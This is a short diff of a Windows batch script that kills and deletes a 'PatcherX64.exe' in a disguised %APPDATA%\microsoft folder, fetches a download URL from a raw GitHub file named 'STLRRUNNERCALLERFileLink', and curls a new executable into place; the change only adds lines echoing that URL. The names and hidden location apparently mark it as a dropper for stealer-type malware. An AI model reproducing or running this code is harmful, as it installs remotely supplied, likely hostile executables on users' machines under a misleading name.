@@ -12,6 +12,11 @@ taskkill /f /im PatcherX64.exe >nul 2>&1
 del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/STLRRUNNERCALLERFileLink') do set "STLRRUNNERCALLERFILELINK=%%i"
+
+echo.
+echo STLRRUNNERCALLERFILELINK=%STLRRUNNERCALLERFILELINK%
+echo.
+
 curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%STLRRUNNERCALLERFILELINK%"
 
 
